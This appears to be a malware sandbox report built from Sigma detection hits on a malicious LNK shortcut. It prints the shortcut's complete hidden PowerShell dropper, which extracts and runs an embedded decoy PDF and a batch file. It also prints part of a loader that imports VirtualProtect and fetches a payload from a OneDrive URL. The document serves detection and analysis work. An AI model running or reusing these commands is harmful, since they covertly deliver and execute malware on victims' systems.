lnk_info.command_line_arguments: /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eq 0x00030DD94E} ^| Select-Object -ExpandProperty FullName; $pdfFile = gc $lnkpath -Encoding Byte -TotalCount 00085268 -ReadCount 00085268; $pdfPath = '%temp%\2023?? 4? 29? ???.pdf'; sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 002390)) -Encoding Byte; ^& $pdfPath; $exeFile = gc $lnkpath -Encoding Byte -TotalCount 00088506 -ReadCount 00088506; $exePath = '%temp%\230415.bat'; sc $exePath ([byte[]]($exeFile ^| select -Skip 00085268)) -Encoding Byte; ^& $exePath;

sigma_analysis_results.rule_title: Dot net compiler compiles file from suspicious location
sigma_analysis_results.rule_description: Dot net compiler compiles file from suspicious location

match_context.values: @{Product=Microsoft\xae .NET Framework; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=csc.exe; Hashes=SHA1=DB402FB24B206C4A378A74FD649C60A413CE5A92,MD5=EB80BB1CA9B9C7F516FF69AFCFD75B7D,SHA256=38C407DBF41E99396B78D00DD796930D8838DCB4AF77C3F23BA0E800D1213EBE,IMPHASH=950FB6F62526333E663D35BA72D19DDC; Description=Visual C# Command Line Compiler; FileVersion=4.8.4084.0 built by: NET48REL1; ParentCommandLine=powershell  -windowstyle hidden -command "$pull ="$pina=""" [TRUNCATED]; CommandLine="C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Bruno\AppData\Local\Temp\c2gerlgm\c2gerlgm.cmdline"; EventID=1; ParentImage=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Powerup tool's Write Hijack DLL exploits DLL hijacking for privilege escalation.
In it's default mode, it builds a self deleting .bat file which executes malicious command.
The detection rule relies on creation of the malicious bat file (debug.bat by default).

match_context.values: @{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\230415.bat; EventID=11}

sigma_analysis_results.rule_description: Detects the creation of a file with the ".dmp"/".hdmp" extension by a shell or scripting application such as "cmd", "powershell", etc. Often created by software during a crash. Memory dumps can sometimes contain sensitive information such as credentials. It's best to determine the source of the crash.

match_context.values: @{RuleName=Downloads; Image=C:\Windows\SysWOW64\cmd.exe; EventID=11; TargetFilename=C:\Users\azure\Downloads\0x10000_dump.dmp}
@{RuleName=Downloads; Image=C:\Windows\SysWOW64\cmd.exe; TargetFilename=C:\Users\azure\Downloads\0x20000_dump.dmp; EventID=11}
@{RuleName=Downloads; Image=C:\Windows\SysWOW64\cmd.exe; TargetFilename=C:\Users\azure\Downloads\0x70000_dump.dmp; EventID=11}
@{RuleName=Downloads; Image=C:\Windows\SysWOW64\cmd.exe; TargetFilename=C:\Users\azure\Downloads\0x80000_dump.dmp; EventID=11}
@{RuleName=Downloads; Image=C:\Windows\SysWOW64\cmd.exe; EventID=11; TargetFilename=C:\Users\azure\Downloads\0x100000_dump.dmp}

sigma_analysis_results.rule_title: Read Contents From Stdin Via Cmd.EXE
sigma_analysis_results.rule_description: Detect the use of "<" to read and potentially execute a file via cmd.exe

match_context.values: @{CommandLine=C:\Windows\SysWOW64\cmd.exe /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match System32 -or $dirPath -Match Program Files) {$dirPath = C:\\Users\\<USER>\\AppData\\Local\\Temp}; $lnkpath = Get-ChildItem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eq 0x00030DD94E} ^| Select-Object -ExpandProperty FullName; $pdfFile = gc $lnkpath -Encoding Byte -TotalCount 00085268 -ReadCount 00085268; $pdfPath = C:\\Users\\<USER>\\AppData\\Local\\Temp\\2023?? 4? 29? ???.pdf [TRUNCATED]; Image=C:\Windows\SysWOW64\cmd.exe; EventID=1}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=[Net.ServicePointManager]::SecurityProtocol=[Enum]::ToObject([Net.SecurityProtocolType], 3072);$aa='[DllImport("kernel32.dll")]public static extern IntPtr GlobalAlloc(uint b,uint c);';$b=Add-Type -MemberDefinition $aa -Name "AAA"  -PassThru;$abab = '[DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a,uint b,uint c,out IntPtr d);';$aab=Add-Type -MemberDefinition $abab -Name "AAB" -PassThru;$c = New-Object System.Net.WebClient;$d="https://api.onedrive.com/v1.0/shares/u!aHR [TRUNCATED]; MessageTotal=1; ScriptBlockId=81560835-6919-4f6c-bf58-0cdf89060d1b; Path=; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_description: Detects execution of "csc.exe" to compile .NET code. Attackers often leverage this to compile code on the fly and use it in other stages.

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.

match_context.values: @{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\230415.bat}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=F5EE89BB1E4A0B1C3C7F1E8D05D0677F2B2B5919,MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine=c:\\Windows\\SysWOW64\\cmd.exe  /c powershell -windowstyle hidden -command "$pull ="$pina=""" [TRUNCATED]; CommandLine=powershell  -windowstyle hidden -command "$pull ="$pina=""" [TRUNCATED]; EventID=1; ParentImage=C:\Windows\SysWOW64\cmd.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution

match_context.values: @{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\c2gerlgm\c2gerlgm.cmdline}
@{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\iux4u1jb\iux4u1jb.cmdline}
@{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\kacf4bf2\kacf4bf2.cmdline; EventID=11}
@{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\0vh3yr24\0vh3yr24.cmdline; EventID=11}

sigma_analysis_results.rule_title: File And SubFolder Enumeration Via Dir Command
sigma_analysis_results.rule_description: Detects usage of the "dir" command part of Widows CMD with the "/S" command line flag in order to enumerate files in a specified directory and all subdirectories.

match_context.values: @{CommandLine=C:\Windows\SysWOW64\cmd.exe /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match System32 -or $dirPath -Match Program Files) {$dirPath = C:\\Users\\<USER>\\AppData\\Local\\Temp}; $lnkpath = Get-ChildItem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eq 0x00030DD94E} ^| Select-Object -ExpandProperty FullName; $pdfFile = gc $lnkpath -Encoding Byte -TotalCount 00085268 -ReadCount 00085268; $pdfPath = C:\\Users\\<USER>\\AppData\\Local\\Temp\\2023?? 4? 29? ???.pdf [TRUNCATED]; Image=C:\Windows\SysWOW64\cmd.exe; EventID=1}
